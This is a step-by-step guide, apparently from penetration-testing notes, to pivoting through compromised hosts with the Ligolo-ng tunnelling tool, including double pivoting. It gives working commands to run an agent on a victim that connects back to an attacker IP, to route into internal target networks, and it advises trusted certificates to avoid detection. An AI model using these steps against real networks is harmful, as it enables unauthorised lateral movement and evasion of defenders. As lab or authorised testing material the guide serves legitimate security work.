
### Steps

#### 1. Agent Acquisition

- Download the correct Ligolo-ng agent binary for the compromised host's OS from the official GitHub releases.
- Transfer the agent binary to the compromised host.

#### 2. Proxy Initialization (Attacker Machine)

**Create TUN Interface:**

```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```

**Start Ligolo-proxy:**

- Lab Environment (Self-Signed):

```bash
ligolo-proxy -selfcert
```

- Production/Realistic Test (Trusted CA):

```bash
ligolo-proxy -certfile <cert.pem> -keyfile <key.pem>
```

_(Replace `<cert.pem>` and `<key.pem>` with your certificate and key file paths.)_

#### 3. Agent Connection (Compromised Host)

**Execute Agent:**

```bash
./agent -connect <Attacker_IP>:11601 -ignore-cert
```

_(Use `-ignore-cert` ONLY with self-signed certificates. Replace `<Attacker_IP>` with your attacker machine's IP.)_

#### 4. Tunnel Establishment (Attacker Machine)

**Ligolo-proxy Session:**

- Use the Ligolo-proxy command-line interface to select the active agent session.

**Routing Configuration:**

```bash
sudo ip route add <Target_Network_CIDR> dev ligolo
```

_(Replace `<Target_Network_CIDR>` with the target network's CIDR notation, e.g., `192.168.1.0/24`.)_

**Start Tunnel:**

- Within the Ligolo-proxy session, type:

```bash
start
```

#### 5. Verification and Usage (Attacker Machine)

- Use tools like Nmap, Metasploit, or any other network tool to interact with the target network as if you were directly connected.

#### 6. Advanced (Double Pivoting)

**Second TUN:**

```bash
sudo ip tuntap add user $USER mode tun ligolo-double
sudo ip link set ligolo-double up
```

**Listener Forwarding:**

```bash
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

**Second Agent:**

- Execute the agent on the next compromised host, connecting to the first compromised host's forwarded port.

**Second Route:**

```bash
sudo ip route add <Second_Target_Network_CIDR> dev ligolo-double
```

---

### 🔐 Key Considerations

- **Certificates:** Use trusted certificates for real-world scenarios to avoid detection.
- **Listeners:** Ensure proper listeners are set for reverse shells and file transfers.
- **Routing:** Verify correct routing configurations to avoid connectivity issues.
- **Environment Variables:** Using `$USER` makes the TUN interface creation more portable.
- **CIDR Notation:** Recommends using CIDR notation for network routes, which is standard practice.
- **Safety:** Clearly explains when to use the `-ignore-cert` flag.
